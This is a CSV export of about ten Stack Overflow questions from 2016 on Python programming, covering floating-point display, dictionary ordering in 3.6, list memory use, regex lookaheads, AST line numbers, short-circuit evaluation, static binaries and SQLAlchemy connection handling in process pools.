Id,OwnerUserId,CreationDate,Score,Title,Body
39618943,261181.0,2016-09-21 14:07:21+00:00,148,Why does the floating-point value of 4*0.1 look nice in Python 3 but 3*0.1 doesn't?,"<p>I know that most decimals don't have an exact floating point representation (<a href=""http://stackoverflow.com/questions/588004"">Is floating point math broken?</a>).</p>

<p>But I don't see why <code>4*0.1</code> is printed nicely as <code>0.4</code>, but <code>3*0.1</code> isn't, when
both values actually have ugly decimal representations:</p>

<pre><code>&gt;&gt;&gt; 3*0.1
0.30000000000000004
&gt;&gt;&gt; 4*0.1
0.4
&gt;&gt;&gt; from decimal import Decimal
&gt;&gt;&gt; Decimal(3*0.1)
Decimal('0.3000000000000000444089209850062616169452667236328125')
&gt;&gt;&gt; Decimal(4*0.1)
Decimal('0.40000000000000002220446049250313080847263336181640625')
</code></pre>
"
39980323,6260170.0,2016-10-11 14:59:23+00:00,72,Dictionaries are ordered in Python 3.6,"<p>Dictionaries are ordered in Python 3.6, unlike in previous Python incarnations. This seems like a substantial change, but it's only a short paragraph in the <a href=""https://docs.python.org/3.6/whatsnew/3.6.html#other-language-changes"">documentation</a>. It is described as an implementation detail rather than a language feature, but also implies this may become standard in the future.</p>

<p>How does the Python 3.6 dictionary implementation perform better than the older one while preserving element order? </p>

<p>Here is the text from the documentation:</p>

<blockquote>
  <p><code>dict()</code> now uses a âcompactâ representation <a href=""https://morepypy.blogspot.com/2015/01/faster-more-memory-efficient-and-more.html"">pioneered by PyPy</a>. The memory usage of the new dict() is between 20% and 25% smaller compared to Python 3.5. <a href=""https://www.python.org/dev/peps/pep-0468"">PEP 468</a> (Preserving the order of **kwargs in a function.) is implemented by this. The order-preserving aspect of this new implementation is considered an implementation detail and should not be relied upon (this may change in the future, but it is desired to have this new dict implementation in the language for a few releases before changing the language spec to mandate order-preserving semantics for all current and future Python implementations; this also helps preserve backwards-compatibility with older versions of the language where random iteration order is still in effect, e.g. Python 3.5). (Contributed by INADA Naoki in <a href=""https://bugs.python.org/issue27350"">issue 27350</a>. Idea <a href=""https://mail.python.org/pipermail/python-dev/2012-December/123028.html"">originally suggested by Raymond Hettinger</a>.)</p>
</blockquote>
"
40018398,3124746.0,2016-10-13 10:25:25+00:00,54,list() uses more memory than list comprehension,"<p>So i was playing with <code>list</code> objects and found little strange thing that if <code>list</code> is created with <code>list()</code> it uses more memory, than list comprehension? I'm using Python 3.5.2</p>

<pre><code>In [1]: import sys
In [2]: a = list(range(100))
In [3]: sys.getsizeof(a)
Out[3]: 1008
In [4]: b = [i for i in range(100)]
In [5]: sys.getsizeof(b)
Out[5]: 912
In [6]: type(a) == type(b)
Out[6]: True
In [7]: a == b
Out[7]: True
In [8]: sys.getsizeof(list(b))
Out[8]: 1008
</code></pre>

<p>From the <a href=""https://docs.python.org/3.5/library/stdtypes.html#list"">docs</a>:</p>

<blockquote>
  <p>Lists may be constructed in several ways:</p>
  
  <ul>
  <li>Using a pair of square brackets to denote the empty list: <code>[]</code></li>
  <li>Using square brackets, separating items with commas: <code>[a]</code>, <code>[a, b, c]</code></li>
  <li>Using a list comprehension: <code>[x for x in iterable]</code></li>
  <li>Using the type constructor: <code>list()</code> or <code>list(iterable)</code></li>
  </ul>
</blockquote>

<p>But it seems that using <code>list()</code> it uses more memory.</p>

<p>And as much <code>list</code> is bigger, the gap increases.</p>

<p><a href=""https://i.stack.imgur.com/VVHJL.png""><img src=""https://i.stack.imgur.com/VVHJL.png"" alt=""Difference in memory""></a></p>

<p>Why this happens?</p>

<p><strong>UPDATE #1</strong></p>

<p>Test with Python 3.6.0b2:</p>

<pre><code>Python 3.6.0b2 (default, Oct 11 2016, 11:52:53) 
[GCC 5.4.0 20160609] on linux
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.getsizeof(list(range(100)))
1008
&gt;&gt;&gt; sys.getsizeof([i for i in range(100)])
912
</code></pre>

<p><strong>UPDATE #2</strong></p>

<p>Test with Python 2.7.12:</p>

<pre><code>Python 2.7.12 (default, Jul  1 2016, 15:12:24) 
[GCC 5.4.0 20160609] on linux2
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.getsizeof(list(xrange(100)))
1016
&gt;&gt;&gt; sys.getsizeof([i for i in xrange(100)])
920
</code></pre>
"
39843488,336527.0,2016-10-04 03:00:56+00:00,41,How to make an integer larger than any other integer?,"<p>Note: while the accepted answer achieves the result I wanted, and @ecatmur answer provides a more comprehensive option, I feel it's very important to emphasize that my use case is a bad idea in the first place. This is explained very well in <a href=""http://stackoverflow.com/a/39856605/336527"">@Jason Orendorff answer below</a>.</p>

<p>Note: this question is not a duplicate of <a href=""http://stackoverflow.com/questions/13795758/what-is-sys-maxint-in-python-3"">the question about <code>sys.maxint</code></a>. It has nothing to do with <code>sys.maxint</code>; even in python 2 where <code>sys.maxint</code> is available, it does NOT represent largest integer (see the accepted answer).</p>

<p>I need to create an integer that's larger than any other integer, meaning an <code>int</code> object which returns <code>True</code> when compared to any other <code>int</code> object using <code>&gt;</code>. Use case: library function expects an integer, and the only easy way to force a certain behavior is to pass a very large integer.</p>

<p>In python 2, I can use <code>sys.maxint</code> (edit: I was wrong). In python 3, <code>math.inf</code> is the closest equivalent, but I can't convert it to <code>int</code>.</p>
"
39779538,178732.0,2016-09-29 20:35:58+00:00,35,"How to get lineno of ""end-of-statement"" in Python ast","<p>I am trying to work on a script that manipulates another script in Python, the script to be modified has structure like:</p>

<pre><code>class SomethingRecord(Record):
    description = 'This records something'
    author = 'john smith'
</code></pre>

<p>I use <code>ast</code> to locate the <code>description</code> line number, and I use some code to change the original file with new description string base on the line number. So far so good.</p>

<p>Now the only issue is <code>description</code> occasionally is a multi-line string, e.g.</p>

<pre><code>    description = ('line 1'
                   'line 2'
                   'line 3')
</code></pre>

<p>or</p>

<pre><code>    description = 'line 1' \
        'line 2' \
        'line 3'
</code></pre>

<p>and I only have the line number of the first line, not the following lines. So my one-line replacer would do</p>

<pre><code>    description = 'new value'
        'line 2' \
        'line 3'
</code></pre>

<p>and the code is broken. I figured that if I know both the lineno of start and end/number of lines of <code>description</code> assignment I could repair my code to handle such situation. How do I get such information with Python standard library?</p>
"
39903242,5149992.0,2016-10-06 18:29:51+00:00,32,Is there a more Pythonic way to combine an Else: statement and an Except:?,"<p>I have a piece of code that searches AutoCAD for text boxes that contain certain keywords (eg. <code>""overall_weight""</code> in this case) and replaces it with a value from a dictionary. However, sometimes the dictionary key is assigned to an empty string and sometimes, the key doesn't exist altogether. In these cases, the <code>""overall_weight""</code> keywords should be replaced with <code>""N/A""</code>. I was wondering if there was a more pythonic way to combine the <code>KeyError</code> exception and the <code>else</code> to both go to <code>nObject.TextString = ""N/A""</code> so its not typed twice.</p>

<pre><code>if nObject.TextString == ""overall_weight"":
    try:
        if self.var.jobDetails[""Overall Weight""]:
            nObject.TextString = self.var.jobDetails[""Overall Weight""]
        else:
            nObject.TextString = ""N/A""
    except KeyError:
        nObject.TextString = ""N/A""
</code></pre>

<p>Edit: For clarification for future visitors, there are only 3 cases I need to take care of and the correct answer takes care of all 3 cases without any extra padding.</p>

<ol>
<li><p><code>dict[key]</code> exists and points to a non-empty string. <code>TextString</code> replaced with the value assigned to <code>dict[key]</code>.</p></li>
<li><p><code>dict[key]</code> exists and points to a empty string. <code>TextString</code> replaced with <code>""N/A""</code>.</p></li>
<li><p><code>dict[key]</code> doesn't exist. <code>TextString</code> replaced with <code>""N/A""</code>.</p></li>
</ol>
"
39796852,1540815.0,2016-09-30 17:22:24+00:00,27,Regular Expression Matching First Non-Repeated Character,"<p><strong>TL;DR</strong></p>

<p><code>re.search(""(.)(?!.*\1)"", text).group()</code> doesn't match the first non-repeating character contained in text (it always returns a character at or before the first non-repeated character, or before the end of the string if there are no non-repeated characters. My understanding is that re.search() should return None if there were no matches).
I'm only interested in understanding why this regex is not working as intended using the Python <code>re</code> module, not in any other method of solving the problem</p>

<p><strong>Full Background</strong></p>

<p>The problem description comes from <a href=""https://www.codeeval.com/open_challenges/12/"">https://www.codeeval.com/open_challenges/12/</a>. I've already solved this problem using a non-regex method, but revisited it to expand my understanding of Python's <code>re</code> module.
The regular expressions i thought would work (named vs unnamed backreferences) are: </p>

<p><code>(?P&lt;letter&gt;.)(?!.*(?P=letter))</code> and <code>(.)(?!.*\1)</code> (same results in python2 and python3)</p>

<p>My entire program looks like this</p>

<pre><code>import re
import sys
with open(sys.argv[1], 'r') as test_cases:
    for test in test_cases:
        print(re.search(""(?P&lt;letter&gt;.)(?!.*(?P=letter))"",
                        test.strip()
                       ).group()
             )
</code></pre>

<p>and some input/output pairs are:</p>

<pre><code>rain | r
teetthing | e
cardiff | c
kangaroo | k
god | g
newtown | e
taxation | x
refurbished | f
substantially | u
</code></pre>

<p>According to what I've read at <a href=""https://docs.python.org/2/library/re.html"">https://docs.python.org/2/library/re.html</a>:</p>

<ul>
<li><code>(.)</code> creates a named group that matches any character and allows later backreferences to it as <code>\1</code>. </li>
<li><code>(?!...)</code> is a negative lookahead which restricts matches to cases where <code>...</code> does not match.</li>
<li><code>.*\1</code> means any number (including zero) of characters followed by whatever was matched by <code>(.)</code> earlier</li>
<li><code>re.search(pattern, string)</code> returns only the first location where the regex pattern produces a match (and would return None if no match could be found)</li>
<li><code>.group()</code> is equivalent to <code>.group(0)</code> which returns the entire match</li>
</ul>

<p>I think these pieces together should solve the stated problem, and it does work like I think it should for most inputs, but failed on <code>teething</code>. Throwing similar problems at it reveals that it seems to ignore repeated characters if they are consecutive:</p>

<pre><code>tooth | o      # fails on consecutive repeated characters
aardvark | d   # but does ok if it sees them later
aah | a        # verified last one didn't work just because it was at start
heh | e        # but it works for this one
hehe | h       # What? It thinks h matches (lookahead maybe doesn't find ""heh""?)
heho | e       # but it definitely finds ""heh"" and stops ""h"" from matching here
hahah | a      # so now it won't match h but will match a
hahxyz | a     # but it realizes there are 2 h characters here...
hahxyza | h    # ... Ok time for StackOverflow
</code></pre>

<p>I know lookbehind and negative lookbehind are limited to 3-character-max fixed length strings, and cannot contain backreferences even if they evaluate to a fixed length string, but I didn't see the documentation specify any restrictions on negative lookahead.</p>
"
39603391,463300.0,2016-09-20 20:42:29+00:00,26,"Short-circuit evaluation like Python's ""and"" while storing results of checks","<p>I have multiple expensive functions that return results.  I want to return a tuple of the results of all the checks if all the checks succeed.  However, if one check fails I don't want to call the later checks, like the short-circuiting behavior of <code>and</code>.  I could nest <code>if</code> statements, but that will get out of hand if there are a lot of checks.  How can I get the short-circuit behavior of <code>and</code> while also storing the results for later use?</p>

<pre><code>def check_a():
    # do something and return the result,
    # for simplicity, just make it ""A""
    return ""A""

def check_b():
    # do something and return the result,
    # for simplicity, just make it ""B""
    return ""B""

...
</code></pre>

<p>This doesn't short-circuit:</p>

<pre><code>a = check_a()
b = check_b()
c = check_c()

if a and b and c:
    return a, b, c
</code></pre>

<p>This is messy if there are many checks:</p>

<pre><code>if a:
   b = check_b()

   if b:
      c = check_c()

      if c:
          return a, b, c
</code></pre>

<p>Is there a shorter way to do this?</p>
"
39913847,2051868.0,2016-10-07 09:24:20+00:00,22,Is there a way to compile python application into static binary?,"<p>What I'm trying to do is ship my code to a remote server, that may have different python version installed and/or may not have packages my app requires.</p>

<p>Right now to achieve such portability I have to build relocatable virtualenv with interpreter and code. That approach has some issues (for example, you have to manually copy a bunch of libraries into your virtualenv, since <code>--always-copy</code> doesn't work as expected) and generally slow.</p>

<p>There's (in theory) <a href=""https://wiki.python.org/moin/BuildStatically"">a way</a> to build python itself statically.</p>

<p>I wonder if I could pack interpreter with my code into one binary and run my application as module. Something like that: <code>./mypython -m myapp run</code> or <code>./mypython -m gunicorn -c ./gunicorn.conf myapp.wsgi:application</code>.</p>
"
39613476,6857561.0,2016-09-21 10:06:08+00:00,20,How to handle SQLAlchemy Connections in ProcessPool?,"<p>I have a reactor that fetches messages from a RabbitMQ broker and triggers worker methods to process these messages in a process pool, something like this:</p>

<p><a href=""http://i.stack.imgur.com/eKbAK.png""><img src=""http://i.stack.imgur.com/eKbAK.png"" alt=""Reactor""></a></p>

<p>This is implemented using python <code>asyncio</code>, <code>loop.run_in_executor()</code> and <code>concurrent.futures.ProcessPoolExecutor</code>.</p>

<p>Now I want to access the database in the worker methods using SQLAlchemy. Mostly the processing will be very straightforward and quick CRUD operations.</p>

<p>The reactor will process 10-50 messages per second in the beginning, so it is not acceptable to open a new database connection for every request. Rather I would like to maintain one persistent connection per process.</p>

<p>My questions are: How can I do this? Can I just store them in a global variable? Will the SQA connection pool handle this for me? How to clean up when the reactor stops?</p>

<p><strong>[Update]</strong></p>

<ul>
<li>The database is MySQL with InnoDB.</li>
</ul>

<p><strong>Why choosing this pattern with a process pool?</strong></p>

<p>The current implementation uses a different pattern where each consumer runs in its own thread. Somehow this does not work very well. There are already about 200 consumers each running in their own thread, and the system is growing quickly. To scale better, the idea was to separate concerns and to consume messages in an I/O loop and delegate the processing to a pool. Of course, the performance of the whole system is mainly I/O bound. However, CPU is an issue when processing large result sets.</p>

<p>The other reason was ""ease of use."" While the connection handling and consumption of messages is implemented asynchronously, the code in the worker can be synchronous and simple.   </p>

<p>Soon it became evident that accessing remote systems through persistent network connections from within the worker are an issue. This is what the CommunicationChannels are for: Inside the worker, I can grant requests to the message bus through these channels.</p>

<p>One of my current ideas is to handle DB access in a similar way: Pass statements through a queue to the event loop where they are sent to the DB. However, I have no idea how to do this with SQLAlchemy. 
Where would be the entry point? 
Objects need to be <code>pickled</code> when they are passed through a queue. How do I get such an object from an SQA query?
The communication with the database has to work asynchronously in order not to block the event loop. Can I use e.g. aiomysql as a database driver for SQA?  </p>
"
